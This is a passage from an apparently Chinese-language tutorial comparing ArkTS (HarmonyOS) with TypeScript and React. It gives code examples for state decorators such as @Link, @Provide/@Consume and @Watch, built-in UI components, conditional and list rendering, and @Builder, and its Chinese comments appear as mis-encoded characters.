  <span class="hljs-comment">// @Linkå®ç°çˆ¶å­ç»„ä»¶åŒå‘æ•°æ®åŒæ­¥</span>
  <span class="hljs-comment">// å­ç»„ä»¶å¯ä»¥ä¿®æ”¹ï¼Œä¼šåŒæ­¥åˆ°çˆ¶ç»„ä»¶</span>
  <span class="hljs-meta">@Link</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Child: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Child +1'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++; <span class="hljs-comment">// ä¿®æ”¹ä¼šåŒæ­¥åˆ°çˆ¶ç»„ä»¶</span>
        })
    }
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ParentComponent</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">parentCount</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Parent: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.parentCount}</span>`</span>)
      <span class="hljs-comment">// ä½¿ç”¨$ç¬¦å·ä¼ é€’å¼•ç”¨</span>
      <span class="hljs-title class_">ChildComponent</span>({ <span class="hljs-attr">count</span>: $parentCount })
    }
  }
}
</code></pre>
<p><strong>TypeScriptå¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptéœ€è¦é€šè¿‡å›è°ƒå‡½æ•°å®ç°åŒå‘ç»‘å®š</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ChildComponent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-keyword">private</span> count: <span class="hljs-built_in">number</span>,
    <span class="hljs-keyword">private</span> onChange: (value: <span class="hljs-built_in">number</span>) =&gt; <span class="hljs-built_in">void</span>
  </span>) {}
  
  <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onChange</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>); <span class="hljs-comment">// æ‰‹åŠ¨é€šçŸ¥çˆ¶ç»„ä»¶</span>
  }
}
</code></pre>
<h4 data-id="heading-44">@Provide å’Œ @Consume - è·¨å±‚çº§ä¼ é€’</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¥–å…ˆç»„ä»¶æä¾›æ•°æ®</span>
<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">GrandParent</span> {
  <span class="hljs-meta">@Provide</span>(<span class="hljs-string">'theme'</span>) <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'dark'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Parent</span>()
    }
  }
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Parent</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Child</span>()
    }
  }
}

<span class="hljs-comment">// åä»£ç»„ä»¶æ¶ˆè´¹æ•°æ®ï¼Œæ— éœ€é€å±‚ä¼ é€’</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Child</span> {
  <span class="hljs-meta">@Consume</span>(<span class="hljs-string">'theme'</span>) <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Theme: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.theme}</span>`</span>)
      .<span class="hljs-title function_">fontColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">theme</span> === <span class="hljs-string">'dark'</span> ? <span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span> : <span class="hljs-title class_">Color</span>.<span class="hljs-property">Black</span>)
  }
}
</code></pre>
<p><strong>TypeScriptå¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptéœ€è¦ä½¿ç”¨Contextæˆ–é€å±‚ä¼ é€’props</span>
<span class="hljs-comment">// Reactç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">'light'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">GrandParent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"dark"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Parent</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span>
  );
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{theme}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<h4 data-id="heading-45">@ObjectLink å’Œ @Observed - åµŒå¥—å¯¹è±¡å“åº”å¼</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Observedè£…é¥°ç±»ï¼Œä½¿å…¶å®ä¾‹å…·æœ‰å“åº”å¼èƒ½åŠ›</span>
<span class="hljs-meta">@Observed</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PersonCard</span> {
  <span class="hljs-comment">// @ObjectLinkç”¨äºåµŒå¥—å¯¹è±¡çš„åŒå‘åŒæ­¥</span>
  <span class="hljs-meta">@ObjectLink</span> <span class="hljs-attr">person</span>: <span class="hljs-title class_">Person</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Name: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.person.name}</span>`</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Age: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.person.age}</span>`</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Birthday'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">person</span>.<span class="hljs-property">age</span>++; <span class="hljs-comment">// ä¿®æ”¹ä¼šè§¦å‘UIæ›´æ–°</span>
        })
    }
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PersonList</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">people</span>: <span class="hljs-title class_">Person</span>[] = [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'Zhang San'</span>, <span class="hljs-number">25</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'Li Si'</span>, <span class="hljs-number">30</span>)
  ];
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">people</span>, <span class="hljs-function">(<span class="hljs-params">person: Person</span>) =&gt;</span> {
        <span class="hljs-title class_">PersonCard</span>({ <span class="hljs-attr">person</span>: person })
      })
    }
  }
}
</code></pre>
<h4 data-id="heading-46">@Watch - çŠ¶æ€ç›‘å¬</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">WatchExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-meta">@Watch</span>(<span class="hljs-string">'onCountChange'</span>) <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  
  <span class="hljs-comment">// ç›‘å¬countå˜åŒ–</span>
  <span class="hljs-title function_">onCountChange</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span> = <span class="hljs-string">`Count changed to <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">`Count is now: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>);
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Increase'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++; <span class="hljs-comment">// ä¼šè§¦å‘onCountChange</span>
        })
    }
  }
}
</code></pre>
<h3 data-id="heading-47">3. å£°æ˜å¼UIæ„å»ºè¯­æ³•</h3>
<h4 data-id="heading-48">struct ç»“æ„ä½“ï¼ˆç”¨äºUIç»„ä»¶ï¼‰</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSä½¿ç”¨structå®šä¹‰UIç»„ä»¶</span>
<span class="hljs-comment">// TypeScriptæ²¡æœ‰è¿™ç§UIç»„ä»¶å®šä¹‰æ–¹å¼</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">MyComponent</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello'</span>)
    }
  }
}
</code></pre>
<h4 data-id="heading-49">build() æ–¹æ³•</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// buildæ–¹æ³•æ˜¯ArkTSç»„ä»¶çš„æ ¸å¿ƒ</span>
<span class="hljs-comment">// ç”¨äºå£°æ˜å¼åœ°æè¿°UIç»“æ„</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">UIExample</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// é“¾å¼è°ƒç”¨è®¾ç½®å±æ€§</span>
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Title'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Click'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Clicked'</span>);
        })
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">justifyContent</span>(<span class="hljs-title class_">FlexAlign</span>.<span class="hljs-property">Center</span>)
  }
}
</code></pre>
<h3 data-id="heading-50">4. å†…ç½®UIç»„ä»¶</h3>
<p>ArkTSæä¾›äº†å¤§é‡å†…ç½®UIç»„ä»¶ï¼ŒTypeScriptæ²¡æœ‰ã€‚</p>
<h4 data-id="heading-51">å®¹å™¨ç»„ä»¶</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ContainerExample</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// Column - å‚ç›´å¸ƒå±€</span>
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">10</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 1'</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 2'</span>)
    }
    
    <span class="hljs-comment">// Row - æ°´å¹³å¸ƒå±€</span>
    <span class="hljs-title class_">Row</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Left'</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Right'</span>)
    }
    
    <span class="hljs-comment">// Stack - å±‚å å¸ƒå±€</span>
    <span class="hljs-title class_">Stack</span>() {
      <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.bg'</span>))
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Overlay Text'</span>)
    }
    
    <span class="hljs-comment">// Flex - å¼¹æ€§å¸ƒå±€</span>
    <span class="hljs-title class_">Flex</span>({ <span class="hljs-attr">direction</span>: <span class="hljs-title class_">FlexDirection</span>.<span class="hljs-property">Row</span>, <span class="hljs-attr">wrap</span>: <span class="hljs-title class_">FlexWrap</span>.<span class="hljs-property">Wrap</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 1'</span>).<span class="hljs-title function_">width</span>(<span class="hljs-string">'30%'</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 2'</span>).<span class="hljs-title function_">width</span>(<span class="hljs-string">'30%'</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 3'</span>).<span class="hljs-title function_">width</span>(<span class="hljs-string">'30%'</span>)
    }
    
    <span class="hljs-comment">// Grid - ç½‘æ ¼å¸ƒå±€</span>
    <span class="hljs-title class_">Grid</span>() {
      <span class="hljs-title class_">GridItem</span>() { <span class="hljs-title class_">Text</span>(<span class="hljs-string">'1'</span>) }
      <span class="hljs-title class_">GridItem</span>() { <span class="hljs-title class_">Text</span>(<span class="hljs-string">'2'</span>) }
      <span class="hljs-title class_">GridItem</span>() { <span class="hljs-title class_">Text</span>(<span class="hljs-string">'3'</span>) }
    }
    .<span class="hljs-title function_">columnsTemplate</span>(<span class="hljs-string">'1fr 1fr 1fr'</span>)
    .<span class="hljs-title function_">rowsTemplate</span>(<span class="hljs-string">'1fr 1fr'</span>)
  }
}
</code></pre>
<h4 data-id="heading-52">åŸºç¡€ç»„ä»¶</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">BasicComponents</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">inputValue</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">isChecked</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">sliderValue</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">50</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">15</span> }) {
      <span class="hljs-comment">// Textç»„ä»¶</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello HarmonyOS'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
      
      <span class="hljs-comment">// Buttonç»„ä»¶</span>
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Click Me'</span>)
        .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Button clicked'</span>);
        })
      
      <span class="hljs-comment">// Imageç»„ä»¶</span>
      <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.icon'</span>))
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">50</span>)
      
      <span class="hljs-comment">// TextInputç»„ä»¶</span>
      <span class="hljs-title class_">TextInput</span>({ <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'Enter text'</span> })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'90%'</span>)
        .<span class="hljs-title function_">onChange</span>(<span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">inputValue</span> = value;
        })
      
      <span class="hljs-comment">// Checkboxç»„ä»¶</span>
      <span class="hljs-title class_">Checkbox</span>()
        .<span class="hljs-title function_">select</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isChecked</span>)
        .<span class="hljs-title function_">onChange</span>(<span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">boolean</span></span>) =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">isChecked</span> = value;
        })
      
      <span class="hljs-comment">// Sliderç»„ä»¶</span>
      <span class="hljs-title class_">Slider</span>({
        <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderValue</span>,
        <span class="hljs-attr">min</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">max</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">step</span>: <span class="hljs-number">1</span>
      })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'90%'</span>)
        .<span class="hljs-title function_">onChange</span>(<span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderValue</span> = value;
        })
      
      <span class="hljs-comment">// Progressç»„ä»¶</span>
      <span class="hljs-title class_">Progress</span>({ <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderValue</span>, <span class="hljs-attr">total</span>: <span class="hljs-number">100</span> })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'90%'</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
  }
}
</code></pre>
<h3 data-id="heading-53">5. æ¡ä»¶æ¸²æŸ“å’Œå¾ªç¯æ¸²æŸ“</h3>
<h4 data-id="heading-54">if/else æ¡ä»¶æ¸²æŸ“</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ConditionalRender</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">isLoggedIn</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">userType</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'guest'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-comment">// ifæ¡ä»¶æ¸²æŸ“</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span>) {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Welcome back!'</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Please login'</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
      }
      
      <span class="hljs-comment">// if-else if-else</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">userType</span> === <span class="hljs-string">'admin'</span>) {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Admin Panel'</span>)
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">userType</span> === <span class="hljs-string">'user'</span>) {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'User Dashboard'</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Guest Mode'</span>)
      }
      
      <span class="hljs-comment">// ä¸‰å…ƒè¡¨è¾¾å¼</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span> ? <span class="hljs-string">'Online'</span> : <span class="hljs-string">'Offline'</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span> ? <span class="hljs-title class_">Color</span>.<span class="hljs-property">Green</span> : <span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
    }
  }
}
</code></pre>
<h4 data-id="heading-55">ForEach å¾ªç¯æ¸²æŸ“</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ListExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">items</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'Apple'</span>, <span class="hljs-string">'Banana'</span>, <span class="hljs-string">'Orange'</span>, <span class="hljs-string">'Grape'</span>];
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-comment">// ForEachå¾ªç¯æ¸²æŸ“</span>
      <span class="hljs-title class_">ForEach</span>(
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>,                    <span class="hljs-comment">// æ•°æ®æº</span>
        <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span>, index: <span class="hljs-built_in">number</span></span>) =&gt;</span> {  <span class="hljs-comment">// æ¸²æŸ“å‡½æ•°</span>
          <span class="hljs-title class_">Row</span>() {
            <span class="hljs-title class_">Text</span>(<span class="hljs-string">`<span class="hljs-subst">${index + <span class="hljs-number">1</span>}</span>. <span class="hljs-subst">${item}</span>`</span>)
              .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">18</span>)
          }
          .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
          .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
        },
        <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span></span>) =&gt;</span> item         <span class="hljs-comment">// é”®ç”Ÿæˆå‡½æ•°ï¼ˆå¯é€‰ï¼‰</span>
      )
    }
  }
}
</code></pre>
<h4 data-id="heading-56">LazyForEach æ‡’åŠ è½½åˆ—è¡¨</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®ç°IDataSourceæ¥å£</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IDataSource</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">list</span>: <span class="hljs-built_in">string</span>[] = [];
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">list: <span class="hljs-built_in">string</span>[]</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span> = list;
  }
  
  <span class="hljs-title function_">totalCount</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">length</span>;
  }
  
  <span class="hljs-title function_">getData</span>(<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>[index];
  }
  
  <span class="hljs-title function_">registerDataChangeListener</span>(<span class="hljs-attr">listener</span>: <span class="hljs-title class_">DataChangeListener</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-comment">// æ³¨å†Œç›‘å¬å™¨</span>
  }
  
  <span class="hljs-title function_">unregisterDataChangeListener</span>(<span class="hljs-attr">listener</span>: <span class="hljs-title class_">DataChangeListener</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-comment">// æ³¨é”€ç›‘å¬å™¨</span>
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">LazyListExample</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">data</span>: <span class="hljs-title class_">MyDataSource</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(
    <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> <span class="hljs-string">`Item <span class="hljs-subst">${i}</span>`</span>)
  );
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">List</span>() {
      <span class="hljs-comment">// LazyForEachå®ç°æ‡’åŠ è½½ï¼Œåªæ¸²æŸ“å¯è§åŒºåŸŸ</span>
      <span class="hljs-title class_">LazyForEach</span>(
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>,
        <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
          <span class="hljs-title class_">ListItem</span>() {
            <span class="hljs-title class_">Text</span>(item)
              .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
              .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
          }
        },
        <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span></span>) =&gt;</span> item
      )
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
  }
}
</code></pre>
<h3 data-id="heading-57">6. @Builder è‡ªå®šä¹‰æ„å»ºå‡½æ•°</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">BuilderExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-comment">// @Builderè£…é¥°çš„å‡½æ•°å¯ä»¥å¤ç”¨UIç»“æ„</span>
  <span class="hljs-meta">@Builder</span> <span class="hljs-title class_">CustomButton</span>(<span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">action</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>) {
    <span class="hljs-title class_">Button</span>(text)
      .<span class="hljs-title function_">width</span>(<span class="hljs-number">150</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-number">40</span>)
      .<span class="hljs-title function_">onClick</span>(action)
  }
  
